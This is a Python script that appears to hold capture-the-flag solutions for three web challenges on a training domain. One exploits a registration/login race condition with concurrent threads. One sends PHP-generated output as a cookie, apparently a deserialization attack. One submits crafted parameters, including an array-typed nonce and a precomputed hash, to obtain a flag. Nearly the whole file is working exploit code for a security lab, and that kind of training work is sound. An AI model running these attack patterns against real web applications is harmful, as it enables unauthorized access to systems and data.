import sys
import string
import random
import argparse
import threading
import subprocess
import requests

parser = argparse.ArgumentParser()
parser.add_argument("binary", type=str)

class switcher():
    @classmethod
    def indirect(cls, args):
        method = getattr(cls, args.binary, lambda: "invalid")
        return method(args)

    @classmethod
    def aart(cls, args):
        EP = "http://aart.training.jinblack.it"

        def rand_string(N=10):
            return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

        def register(u, p):
            url = "%s/register.php" % EP
            data = {"username": u, "password": p}
            r = requests.post(url, data=data)
            if "SUCCESS!" in r.text:
                return True
            return False

        def login(u, p):
            url = "%s/login.php" % EP
            data = {"username": u, "password": p}
            r = requests.post(url, data=data)
            print(r)
            if "flag" in r.text:
                print(r.text)
                sys.exit(0)

        u = rand_string()
        p = rand_string()

        tr = threading.Thread(target=register, args=(u, p))
        tr.start()
        tl = threading.Thread(target=login, args=(u, p))
        tl.start()

        tr.join()
        tl.join()

    @classmethod
    def free_as_in_beer(cls, args):
        proc = subprocess.Popen("php free_as_in_beer.php", shell=True, stdout=subprocess.PIPE)
        todo = proc.stdout.read().decode("utf-8") 

        url = "http://free.training.jinblack.it"
        cookies = dict(todos=todo)
        r = requests.get(url, cookies=cookies)

        print(r.text)

    @classmethod
    def bearshare(cls, args):
        EP = "http://bearshare.training.jinblack.it"

        url = "%s/download.php" % EP
        data = {
            "nonce[]": "not_empty", 
            "nonce[]": "not_empty",
            "messid": "not_empty",
            "storagesv": "gimmeflag",
            "hash": "028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769"
        }
        r = requests.post(url, data=data)

        print(r.text)

switcher.indirect(parser.parse_args())
